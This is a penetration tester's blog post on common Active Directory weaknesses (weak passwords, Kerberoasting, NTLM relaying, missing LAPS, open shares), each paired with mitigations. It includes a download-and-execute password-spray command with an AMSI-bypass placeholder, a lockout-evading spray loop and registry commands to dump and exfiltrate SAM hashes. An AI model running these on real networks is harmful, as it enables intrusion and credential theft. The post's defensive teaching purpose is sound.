---
title: "The most common on premise vulnerabilities & misconfigurations"
layout: "post"
---

In the last years my team at <a href="https://www.r-tec.net/home.html">r-tec</a> was confronted with many different company environments, in which we had to search for vulnerabilities and misconfigurations. For customers, who have not yet carried out regular penetration tests, we recommend in the initial step to check systems on the Internet (DMZ) as well as internal systems for the most common critical attack techniques and vulnerabilities. This can be done with a predefined number of person-days. Anything found within this period will be included in the report. This approach provides an initial overview of the most critical vulnerabilities and risks from both external and internal threats. For such initial projects, we also recommend choosing an open scope. Here, any of the client's systems will be examined, but also any attack techniques such as social engineering via phishing mails can be used.

In this blog post I'm gonna cover the in my opinion most common findings in a Windows Active Directory environment, which can be found and abused for `Privilege Escalation` and `Lateral Movement` in such a project. It's about *on premise* vulnerabilities and misconfigurations in an internal company environment as well as mitigations.

<!--more-->

## Introduction

Why the *internal* and *on premise* vulnerabilities? At one hand, I have to start with any topic and I chose this one. At the other hand Red-teaming- as well as Pentest- and Incident Response-projects have shown to us in the recent years, that gaining initial access to an internal corporate network, is in the most cases not the toughest challenge. The human factor (social engineering) plays an important role here in the most cases. So, assuming that an attacker can gain relatively straightforward access to an internal network via the internet, one relevant question for a company could be *what can an attacker do in my internal network after gaining initial access?*. One way to give answers to that question is via internal Pentesting. Alternatively it's possible to test the SOC/CERT's capabilities and efficiency with an *Assumed breach* Red-Teaming project. Most of the company networks we´ve seen in the recent years were still on premise or hybrid environments. That means everything was hosted at the customers side in his own Datacenter or parts of the environment were hosted in the cloud such as Azure or AWS services. Therefore the relevance of *internal* as well as *on premise* environment testing should be clear. Personally, I also believe that many companies, especially in europe will not use cloud-only environments in the future, for data privacy reasons (see General Data Protection Regulation (GDPR)).  *External* testing or *Social Engeneering* may be another blog post topic for the future.
 
A not unsubstantial fact has resulted from our internal Pentest projects over the years: In **every** single engagement with an **open scope** starting in the **client-systems network** with the primary goal of checking **Privilege Escalation & Lateral Movement techniques** my team was able to elevate privileges to *Domain Administrator* rights. Compromising the Firewalls, the linux environment or SAP-systems was afterwards relatively easy with these privileges. You don't believe me? `¯\_(ツ)_/ ¯` . This was possible in a timeframe from 10 minutes to ~3 days in the most cases, depending on the environment & found vulnerabilities. However, most of these environments had the same critical vulnerabilities and misconfigurations. Theese vulnerabilities were found in small as well as in multi billion euro company environments. In this post I will highlight them, as well as share recommendations to fix them. All vulnerabilities and techniques are already documented at various places on the internet. Those who are familiar with this topic will therefore most likely not find anything new. Enough bubbling around. Let´s actually take a look at the vulnerabilities and protection mechanisms.

## Patch- & Update-Management process

This is by far the most obvious finding in my opinion. If the environment has a lacking Patch & Update-Management process, there will be single or multiple systems or applications without patches installed. No installation of security-patches leads to vulnerable software and/or systems - in the worst case, the impact is a direct takeover. *Why should I care about an attacker compromising a single system?* Here comes `Lateral Movement` and `Post Exploitation` into the game - I often had the situation, that the compromise of a single system led to a full Active Directory takeover. But I won´t dive into *Post Exploitation* or *Lateral Movement* this time because the post would explode.

You can find the most relevant vulnerabilities in this area by using automated vulnerability scanner software. This can be either a free software like <a href="https://www.openvas.org/">OpenVAS</a> or a commercial scanner like <a href="https://www.tenable.com/products/nessus">nessus</a>. Be aware that depending on the scanner configuration some systems can get unstable or even run in a *Denial of Service (DOS)* state. This is simply due to the nature of a vulnerability scanner - it is sending traffic to every port and service, probes all services, tries to actively exploit vulnerabilities to find them and so on. This kind of traffic is not faced by many systems in daily life so that an overload can take place. Disabling *Denial of Service* modules and a proper configuration for scans can mitigate this risk.

If you never worked with a vulnerability scanner in the internal network, you will certainly be overwhelmed by the high number of findings. In addition, many findings are given a criticality that is, in my view, too high or, in some cases, too low. That makes the prioritisation for the remediation process harder. In general it's a good idea to first remedy the vulnerabilities with the highest criticality. Most companies will have a hard time, if they try to patch everything after the first scan, because it needs too much time fixing everything that fast. If you already have some background knowledge, I'll recommend to fix the vulnerabilities with `Remote Code Execution` impact and `public exploits available` first. Theese vulnerabilities are the ones, that can be exploited automatically by malware/script kiddies or mad employees.

The most common vulnerabilities - leading to a direct system takeover - and which should therefore be remedied with priority, are the following (No guarantee of completeness - these are the ones I have in mind right now):

* Windows Operating Systems (MS08-067, MS17-010, Bluekeep - CVE- 2019-0708, Zerologon - CVE-2020-1472, ProxyLogon - CVE-2021-26855)
* HP System Management Homepage (Several RCEs)
* HP Data Protector (Several RCEs)
* Oracle WebLogic (Deserialisation vulnerabilities)
* Insecure JMX Agents (No authentication leads to RCE)
* Default credentials for any software (Windows, Linux, Apache Tomcat, Redis, Axis2, MSSQL, Oracle, Firebird DB and many more)
* Dameware Mini Remote Control - CVE-2019-3980
* IPMIv2 usage - password hashes for administrative accounts can be extracted
* iLO remote management (Several RCEs)
* JBoss (Several RCEs)
* VNC without authentication
* Jenkins without authentication (script console RCE + others)

There are **many** more easily exploitable RCE vulnerabilitites, but the above ones are the most common in my opinion. So if you are using one of those software from above - go ahead and check the latest patches.

#### Mitigation

This should be pretty obvious. **Periodical** patching and controlling is the key here.

Also - this chapter is called *Patch- and Update-Management* **process**. Patching everything one time will not help you for the future. There needs to be a process, which periodically foresees the installation of updates including the needed time for administrators. Periodic or daily/weekly scanning for new critical vulnerabilities can help you here.

## Kerberoasting && AS_REP Roasting 

Kerberoasting && AS-REP Roasting attacks can be used in the most company environments at least for one or more user. What is is about? Basically it's a weakness in the kerberos protocol itself, which allows in the case of Kerberoasting *any user in the domain* to request a ticket for *vulnerable* service accounts. In the case of AS-REP Roasting *any device in the network* can request a ticket even without authentication. What is the impact? The ticket can, in both cases, be used to create a hash for the service accounts password, which can be cracked offline via wordlist or brute-force attacks. So in the worst case an attacker in the network is able to get cleartext credentials for the vulnerable user. Service accounts often have administrative rights at least at some systems, so for successfully cracked hashes a `Privilege Escalation` via this technique is possible in the most cases. 

I don't need to reinvent the wheel - my colleage <a href="https://twitter.com/theluemmel">@theluemmel</a> wrote a blog post about both techniques and their differences called <a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">AS_REP Roasting vs Kerberoasting</a>. It contains a more detailed explanation, a part about how to find vulnerable users and different tools for exploitation. I strongly recommend reading that article if you didn't already.

#### Mitigation

For kerberoastable users, the only way to mitigate the risk is the usage of complex passwords. By using cryptic passwords with 20 or more characters an attacker will not be able to crack the hash. If you have users with the flag `DoesNotRequirePreAuth` set, which makes them AS-REP roastable, you can either set a complex password or unset this option.

In addition you can actively <a href="https://adsecurity.org/?p=3458">monitor for Kerberoasting</a> or <a href="https://medium.com/@jsecurity101/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec">AS-REP Roasting</a> activities in your network. This way, you can also identify potential attackers in your network.

## Weak passwords

This is, in my opinion, one of the most important, but also for the Blue Team side often the hardest one to *fix*. In an Active Directory Environment, the password policy can be used to force users setting a *more complex* password. The problem with this password policy settings is, that *only* the following adjustments can be made:

* Password length
* Lowercase letters required
* Uppercase letters required
* Special characters required
* Numbers required

In the last years I often did read about the recommendation to use eight-digit passwords with all criteria from above. Most likely companies did read the same, because the password policy in the most company environments forces eight characters with three out of the four complexity requirements. 

I think, that the eight character password complexity recommendation was given due to cracking times via brute force. But already in 2019 it was easily possible to go through the whole character set of eight character passwords in <a href="https://www.theregister.com/2019/02/14/password_length/">a few hours</a>. So if we go by the offline cracking speed, we would need at minimum 10 character long passwords for NTLM (several weeks to months for cracking, depending on the hardware). But is that save? Employees and the human in general is lazy in forms of choosing passwords. So passwords like **Summer2021!**, **Winter#2020**, **CompanyName2021!**, **March2021!** meet the complexity requirements with all requirements but are still weak.

We as attackers can use for example `Domainpasswordspray` attacks with <a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray.ps1</a> or many other public toolings to try one of the mentioned passwords against all Active Directory users. It´s as simple as:

```batch
AMSIBYPASS
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
Invoke-DomainPasswordSpray -Password Summer2021!
```

AMSIBYPASS? Take a look <a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">here</a>.

Maybe the first level support helpdesk is using a password like **Initial2021!** or **Start2021!** for new accounts or password reset requests. Trying this password - or a slight variation of the password - will result in many compromised user-accounts. You got a lockout policy? `¯\_(ツ)_/¯` - everyone can read the values for it via for example the `net accounts` command from a cmd. 

```batch
$words = Get-Content C:\temp\wordlist.txt
ForEach ($Word in $Words){Invoke-Domainpasswordspray -Password $password; Sleep TimeToResetLockOutCount}
```
Other tools like <a href="https://github.com/jnqpblc/SharpSpray">SharpSpray</a> take the delay values as parameter. There are way too many Password-Spray tools to list them all here. Some examples are for OWA <a href="https://github.com/dafthack/MailSniper">Mailsniper</a>, Office365 (<a href="https://github.com/dafthack/MSOLSpray">MSOLSpray</a>), Lync (<a href="https://github.com/mdsecresearch/LyncSniper">LyncSniper</a> or <a href="https://github.com/byt3bl33d3r/SprayingToolkit">SprayingToolkit</a>) and many many more.

The point is - the Microsoft policy doesn´t restrict *enough*, so that weak passwords cannot be chosen. Obviously the best thing you can do for the security level is using Multi-Factor-Authentication everywhere possible. This can also include the windows domain authentication with for example token/smartcards or even the fingerprint. Many companies, however, don´t want to implement this, because of the administrative overhead and therefore the higher costs.

So, what else can we do to avoid weak passwords for user-accounts? I really like and recommend the way of password blacklisting. There are Open Source solutions like <a href="https://github.com/lithnet/ad-password-protection">ad-password-protection</a> or commercial solutions like <a href="https://specopssoft.com/product/specops-password-policy/">Specops Password Policy</a>. Administrators can add for example a wordlist with words that are not allowed. So the company name, names in general (family member names are often choosen with for example birthdates), Seasons, months and so on can be blacklisted. You can even integrate all <a href="https://haveibeenpwned.com/">HaveIBeenPwned</a> passwords. A user could still choose **Summ3r2021!** which will fall in a wordlist+rule offline attack but many many user-accounts with the same password *should* not happen again here.

And - we need to differentiate between administrative and non-administrative accounts. For non-administrative accounts 10 characters and all requirements + password blacklisting is a good thing in my opinion. A low-privileged user may also fall, when executing malware after clicking on a link via email. From my point of view, it is only a matter of time before a single user account in a company falls or is compromised. However, it should be made as difficult as possible for an attacker to elevate privileges or gain access to various other user-account credentials.

To make privilege escalation harder administrative user-accounts should be secured by a more restrictive password policy. Administrators *should* be able to choose **cryptic** passwords with 14 or more characters for service-accounts and other administrative accounts. A *secure* password manager with MFA can be used for administration (Spoiler: KeePass is not a good idea here, <a href="https://www.harmj0y.net/blog/redteaming/a-case-study-in-attacking-keepass/">a-case-study-in-attacking-keepass</a>, <a href="https://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/">keethief-a-case-study-in-attacking-keepass-part-2</a>). Imagine, an attacker gets the `NetNTLMV2` hash via Man-in-the-Middle attacks or retrieves the `NTLM` hash of an administrative account from a compromised system which wasn´t patched. It is important, that it is not possible to break the cleartext password. `Lateral Movement` will be easy with the password. You may ask me - *what about Pass the Hash (PTH), I don't need the cleartext password?*. There is a default Active Directory group called <a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group">Protected Users</a>. If you put sensitive administrative accounts in this group, they will be secured by multiple protection mechanisms. For example, they are only allowed to use Kerberos, which disables `NTLM` for authentication **and** the accounts cannot be delegated anymore (Some words about delegation abuse are <a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1">here</a>).

<p align="center">
          <img src="/assets/posts/OnPremiseVulns/Protected_Users.JPG">
</p>

#### Mitigations

We have several recommendations here in my opinion:

* Use MFA wherever possible
* At minimum 10 character passwords for low privileged user-accounts
* At minimum 14 character **cryptic** passwords for administrative accounts
* Password blacklisting via a filtering DLL or third party software
* Usage of the *Protected Users* group for administrative accounts which disables `NTLM` and therefore `PTH`
* Using a *secure* password manager **with** MFA at least for administrative accounts

## Man-in-the-Middle attacks & Relaying

There are so many blogposts about Man-in-the-Middle attacks and Relaying already. The first post I read about it was by <a href="https://twitter.com/byt3bl33d3r">@byt3bl33d3r</a> called <a href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html">Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)</a> which changed my mindset and approach to internal Pentesting at that time. I did not know, that by being in the Man-in-the-Middle position for `NTLM` authentications it's possible to relay the `NetNTLMv2` hash for code execution or authentication in general. Thats **insane**. And therefore, I used Man-in-the-Middle techniques from that time on in every single internal engagement - whenever this was in scope - with awesome results. The basic principle is explained in this post so go ahead reading it if you didn't already.

How to become Man-in-the-Middle? There are multiple ways. The most common and most used are:

* LLMNR, NBT-NS and MDNS poisoning via <a href="https://github.com/lgandx/Responder">Responder</a> or <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>
* Rogue DHCPv6 server via <a href="https://github.com/fox-it/mitm6">mitm6</a>
* ARP Spoofing via <a href="https://github.com/bettercap/bettercap">Bettercap</a>
* Active Directory Integrated DNS attacks - <a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a>

How exactly can we (ab)use this Man-in-the-Middle position for `Privilege Escalation` and `Lateral Movement`? One way is trying to crack the `NetNTLMv2` hashes gained from the MITM position via <a href="https://github.com/openwall/john">john</a> or <a href="https://hashcat.net/hashcat/">hashcat</a>. And here we are again, at the point **weak passwords**, which is preventable as seen above. 

The seccond technique is `relaying`. And again, I can refer to a blog post by my colleage <a href="https://twitter.com/theluemmel">@theluemmel</a> with his post <a href="https://luemmelsec.github.io/Relaying-101/">Relaying 101</a>. I don´t need to rewrite this, so read it yourself if you want to know about it. Active Directory Integrated DNS is not written down here, so you should also read <a href="https://twitter.com/_dirkjan">@_dirkjan</a>'s article <a href="https://blog.netspi.com/exploiting-adidns/">Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS</a>.

#### Mitigation

* Disable LLMNR/Netbios on windows systems network interfaces, which is still enabled by default
* Deploy a GPO which states "<a href="https://docs.microsoft.com/en-US/troubleshoot/windows-server/networking/configure-ipv6-in-windows">Prefer IPv4 over IPv6</a>" or Disable IPv6 for client-systems (servers can run into trouble by disabling it)
* Enable SMB/LDAP Signing
* Use Switches with ARP Spoofing detection/block mechanisms
* For ADIDNS: Disable *Create all child objects* for *Authenticated Users* and/or set a DNS entry for the Wildcard (*) to 0.0.0.0

Be aware:

<p align="center">
          <img src="/assets/posts/OnPremiseVulns/ADIDNS.JPG">
</p>

## No Role & Authorisation Concept

Many companies *abuse* administrative Active Directory roles for the sake of convenience. I often found *Domain Administrator* groups with more than 10, 20 or even 50 user-accounts in it. The privileges from this group are only needed **in build or disaster recovery scenarios** according to <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-f--securing-domain-admins-groups-in-active-directory">Microsoft</a>. There **should be no day-to-day user accounts in the DA group with the exception of the built-in Administrator account for the domain** . So how many *Domain Administrator* accounts should be there? According to that - only one! And this account should only be used on the Domain Controller. Many other of the Active Directory <a href="https://github.com/MicrosoftDocs/windowsserverdocs/blob/master/WindowsServerDocs/identity/ad-ds/plan/security-best-practices/Appendix-B--Privileged-Accounts-and-Groups-in-Active-Directory.md">Privileged Accounts and Groups</a> like *DnsAdmins*, *Server Operators*, *Account Operators* and so on can, when compromised, also lead to fast and easy `Privilege Escalation` & `Lateral Movement`. If we, as attackers, run 
```batch
SharpHound -C All,GPOLocalGroup
```
to collect data and afterwards import it into our <a href="https://github.com/BloodHoundAD/BloodHound">Bloodhound</a> database to run the query `Find Shortest Path to Domain Admins` and the graph is too big for visualisation, we know, that the *Domain Administrators* are used for service accounts or daily operations, which is pretty bad. Many other AD groups can also be abused to get the highest privileges. So securing theese groups should somehow have the same priority. The following blog post by <a href="https://cube0x0.github.io/Pocing-Beyond-DA/">@cube0x0</a> lists some abuse techniques for groups like *DnsAdmins*, *Server Operators*, *Backup operators* and others: <a href="https://cube0x0.github.io/Pocing-Beyond-DA/">Poc’ing Beyond Domain Admin - Part 1</a>

Microsoft also recommends the use of the <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models">Least-Privilege principle</a>. So instead of for example using *Domain Administrator* accounts for the daily usage and administration (which I saw often by for example even the first level support) accounts should only receive local administrative permissions for those systems, where it's nessesary.

I also really like to run <a href="https://github.com/adrecon/ADRecon">ADRecon</a> in every company environment. It has CSV-files as output but can generate a pretty nice Excel-Report containing all relevant Active Directory information needed for a review. If you want to lookup some group members or user groups its really easy and fast with filtering.

#### Mitigation

The process of implementing this measure may well be more difficult and complex, depending on how *historically grown* the environment is. Anyway, the following can be done:
* Microsoft recommends to use the <a href="https://docs.microsoft.com/en-US/security/compass/privileged-access-access-model">Privileged Access Model</a>
* Reduce the user-accounts in the highest privileged groups as much as possible. Create new groups with local administrator permissions for each group and their specific needed systems.
* **DON't** use *Domain Administrators* for administrative or daily tasks!
* Go through Microsofts <a href="https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/identity/ad-ds/plan/security-best-practices">best practices</a> and try to implement as much as possible. The best practices contain way more information than only the *Role & Authorisation Concept* plus *least privilege principle*.

## No LAPS usage

The Microsoft Local Administrator Password Solution (LAPS) is a <a href="https://www.microsoft.com/en-us/download/details.aspx?id=46899">free downloadable</a> centralized management software for local account passwords of domain joined computers. Each systems local administrator account gets an complex cryptic password assigned, which is automatically changed every 15-30 days. The passwords are stored in the Active Directory and specific users or groups can get read access to those passwords by ACL.

An attacker needs to compromise only a single system to get it's local administrator password hash from the `SAM` database. This can be done with the Mimikatz command `lsadump::sam`, using <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1">Invoke-PowerDump</a> or manually via cmd with 

```batch

reg save hklm\sam c:\temp\sam
reg save hklm\system c:\temp\system

# Exfiltrate to a linux system and run the following:
samdump2 system sam
```
If no centralized local password solution is in place, the compromise of a single system can lead to a domain wide compromise in the worst case. That's, because the local administrator will most likely have the same password on each system. An attacker can use `Pass-The-Hash` to compromise other systems with the extracted `NTLM`-Hash, or crack the password to login with the cleartext password - if that is weakly chosen.

Be aware, that by creating your own password manager solution you *might* run into other critical vulnerabilities. I saw companies using a self developed password manager solution, which deployed a .NET service executable on each system. The passwords were changed via this service. Decompiling the assembly via <a href="https://github.com/icsharpcode/ILSpy">IlSpy</a> resulted in hardcoded domain administrator credentials as well as the generation algorithm for local administrators. In other environments, I saw a centralized webserver with Powershell-scripts hosted in a directory. They were executed for the initial system setup. The scripts contained <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.1">Powershell Securestrings</a> for passwords or the algorithm for password creation. Therefore - before spending too much time in a self developed software/script, I recommend using the available solutions like LAPS.

#### Mitigation
* Implement LAPS if not already done
* Restrict network logons for local administrator accounts via GPO `Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\User Rights Assignments` -> This also prevents `Lateral Movement` via network logons
1.  Deny access to this computer from the network
2.  Deny log on as a batch job
3.  Deny log on as a service
4.  Deny log on through Remote Desktop Services 

## Network shares && Decryptable passwords

One thing - which is depending on the environment pretty time consuming for us attackers - also leads to `Privilege Escalation` in many company environments. That is network shares readable or read/writeble by every *domain user* account. There are **many** public tools, which allow us attackers to search for network shares and content in it. The following are my favorite tools for that task - depending on the situation and engagement type:

Powersploits (PowerView) <a href="https://powersploit.readthedocs.io/en/latest/Recon/Find-InterestingDomainShareFile/">Find-InterestingDomainShareFile</a> - automatically searches through the domain with a predefined filter.

<a href="https://github.com/SnaffCon/Snaffler/">Snaffler</a> - automates the Share Enumeration and has pretty good predefined filters for sensitive files and/or contents. The only negative thing in my mind is the high CPU usage in bigger environments. The system, on which it is executed, often became unstable and the scan never ended.

<a href="https://github.com/Dionach/PassHunt">Dionachs Passhunt</a> - I'm using this most times manually for specific shares, the file extensions to search for and the filter via regex can be choosen via parameter and the HTML-report is beautiful. 

<a href="https://www.softperfect.com/products/networkscanner/">Softperfect Network Scanner portable</a> - if you are not working over a C2 server this one let`s you search through IP-ranges with an easy to use GUI. No filters, only the network share search itself. Searching the web you will find one free version - the last one before it became commercial.

What do we typically search for in those network shares?

* Cleartext passwords
* Encoded/encrypted passwords
* Backup-Files
* Configuration files
* Image Backups like VMDK or others
* Webserver source code - for self developed internal webservers this might lead to easy RCE quickwins
* Password Manager databases like for example `.kdbx` or `.kdb` files

Theese contents can be found with for example the tools above via predifined filters or with custom filters. In many cases however I'm manually reviewing many shares, because that leads to more and other results.

#### Mitigation

* Check all domain and non-domain systems for network shares
* If the share contains sensitive informations like the mentioned above - restrict access to it or remove the sensitive files

### GPP-passwords

Somehow a subgroup of network shares. There are too many blog posts about this one already. Just read the following if you don't know what it's about:

<a href="https://adsecurity.org/?p=2288">https://adsecurity.org/?p=2288</a>

Finding and decrypting these files is as easy as `Get-GPPPassword` via <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">PowerSploit</a> for example.

#### Mitigation
* Delete the XML files containing encrypted passwords

## Credential theft hardening measures

One more thing to mention. There are two credential theft hardening measures for Windows Active Directory environments, which make life **much** harder for us attackers. The following two things should be enabled to protect against credential theft which can be used for PrivEsc & Lateral Movement:

1. Enable <a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection">LSA Protection</a>: Only trusted binaries/drivers can touch the lsass process with LSA Protection enabled. This makes it harder <a href="https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection">but not impossible</a> to dump credentials from memory.
2. Enable <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage">Credential Guard</a>. With this enabled we attackers cannot live dump credentials from lsass anymore. It's still possible to add a <a href="https://book.hacktricks.xyz/windows/active-directory-methodology/custom-ssp">custom SSP</a> to live capture credentials. Or it`s possible to friendly <a href="https://github.com/S3cur3Th1sSh1t/Pentest-Tools#post-exploitation---phish-credentials">ask the user</a> for credentials. 

## Conclusion

I have decided to make a hard cut at this point. The blogpost is already quite long. I could list a few more things at this point, such as constrained/unconstrained delegation, passwords in description fields or user-attributes, MSSQL-attacks, WSUS over http and so on. Instead I'll drop some links for further reading. So if you are in the mood for more:

* <a href="https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</a>
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Active Directory Attack.md</a>
* <a href="https://adsecurity.org/?page_id=4031">https://adsecurity.org/?page_id=4031</a>

The above mentioned vulnerabilities are in my opinion still the ones, that occur the most often in different environments. If all the issues mentioned here can be addressed, the next offensive security project or even an incident will certainly look better for the Blue Team as we attackers (neither good or bad intention) will have a harder time.

This blogpost is somehow different from the previous ones in terms of both content and structure. Less code & evasion techniques and more focused for the defending site. Nevertheless, I hope that both sides were able to benefit from this post. Comments and feedback is as always welcome via the channels above.

## Links & Resources

*  r-tec - <a href="https://www.r-tec.net/home.html">https://www.r-tec.net/home.html</a>
*  OpenVas scanner - <a href="https://www.openvas.org/">https://www.openvas.org/</a>
*  nessus scanner - <a href="https://www.tenable.com/products/nessus">https://www.tenable.com/products/nessus</a>
*  Kerberoasting vs AS-REP Roasting - <a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/</a>
*  Detecting Kerberoasting Activity - <a href="https://adsecurity.org/?p=3458">https://adsecurity.org/?p=3458</a>
*  IOC differences between Kerberoasting and AS-REP Roasting - <a href="https://medium.com/@jsecurity101/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec">https://medium.com/@jsecurity101/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec</a>
*  8 char passwords cracked - <a href="https://www.theregister.com/2019/02/14/password_length/">https://www.theregister.com/2019/02/14/password_length/</a>
*  Domainpasswordspray - <a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a>
*  Bypass AMSI by manual modification - <a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/</a>
*  SharpSpray - <a href="https://github.com/jnqpblc/SharpSpray">https://github.com/jnqpblc/SharpSpray</a>
*  MailSniper - <a href="https://github.com/dafthack/MailSniper">https://github.com/dafthack/MailSniper</a>
*  MSOLSpray - <a href="https://github.com/dafthack/MSOLSpray">https://github.com/dafthack/MSOLSpray</a>
*  LyncSniper - <a href="https://github.com/mdsecresearch/LyncSniper">https://github.com/mdsecresearch/LyncSniper</a>
*  SprayingToolkit - <a href="https://github.com/byt3bl33d3r/SprayingToolkit">https://github.com/byt3bl33d3r/SprayingToolkit</a>
*  Open Source password blacklisting - <a href="https://github.com/lithnet/ad-password-protection">https://github.com/lithnet/ad-password-protection</a>
*  Commercial password blacklisting - <a href="https://specopssoft.com/product/specops-password-policy/">https://specopssoft.com/product/specops-password-policy/</a>
*  HaveIBeenPwned - <a href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a>
*  A case study in attacking KeePass - <a href="https://www.harmj0y.net/blog/redteaming/a-case-study-in-attacking-keepass/">https://www.harmj0y.net/blog/redteaming/a-case-study-in-attacking-keepass/</a>
*  A case study in attacking KeePass part II - <a href="https://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/">https://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/</a>
*  Protected Users group - <a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group">https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group</a>
*  Unconstrained delegation - <a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1">https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1</a>
*  Practical guide to NTLM relaying in 2017 - <a href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html">https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</a>
*  Responder - <a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a>
*  Inveigh - <a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a>
*  mitm6 - <a href="https://github.com/fox-it/mitm6">https://github.com/fox-it/mitm6</a>
*  bettercap - <a href="https://github.com/bettercap/bettercap">https://github.com/bettercap/bettercap</a>
*  Powermad - <a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a>
*  johntheripper - <a href="https://github.com/openwall/john">https://github.com/openwall/john</a>
*  hashcat - <a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a>
*  Relaying 101 - <a href="https://luemmelsec.github.io/Relaying-101/">https://luemmelsec.github.io/Relaying-101/</a>
*  Exploiting ADIDNS - <a href="https://blog.netspi.com/exploiting-adidns/">https://blog.netspi.com/exploiting-adidns/</a>
*  Prefer Ipv4 over Ipv6 - <a href="https://docs.microsoft.com/en-US/troubleshoot/windows-server/networking/configure-ipv6-in-windows">https://docs.microsoft.com/en-US/troubleshoot/windows-server/networking/configure-ipv6-in-windows</a>
*  Securing the Domain Admins group - <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-f--securing-domain-admins-groups-in-active-directory">https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-f--securing-domain-admins-groups-in-active-directory</a>
*  Privileged accounts and groups - <a href="https://github.com/MicrosoftDocs/windowsserverdocs/blob/master/WindowsServerDocs/identity/ad-ds/plan/security-best-practices/Appendix-B--Privileged-Accounts-and-Groups-in-Active-Directory.md">https://github.com/MicrosoftDocs/windowsserverdocs/blob/master/WindowsServerDocs/identity/ad-ds/plan/security-best-practices/Appendix-B--Privileged-Accounts-and-Groups-in-Active-Directory.md</a>
*  Bloodhound - <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a>
*  Pocing Beyong DA - <a href="https://cube0x0.github.io/Pocing-Beyond-DA/">https://cube0x0.github.io/Pocing-Beyond-DA/</a>
*  Implementing least privilege administrative models - <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models">https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models</a>
*  ADRecon - <a href="https://github.com/adrecon/ADRecon">https://github.com/adrecon/ADRecon</a>
*  Privileged access model - <a href="https://docs.microsoft.com/en-US/security/compass/privileged-access-access-model">https://docs.microsoft.com/en-US/security/compass/privileged-access-access-model</a>
*  Microsoft Security best practices - <a href="https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/identity/ad-ds/plan/security-best-practices">https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/identity/ad-ds/plan/security-best-practices</a>
*  LAPS - <a href="https://www.microsoft.com/en-us/download/details.aspx?id=46899">https://www.microsoft.com/en-us/download/details.aspx?id=46899</a>
*  Invoke-PowerDump - <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1">https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1</a>
*  IlSpy - <a href="https://github.com/icsharpcode/ILSpy">https://github.com/icsharpcode/ILSpy</a>
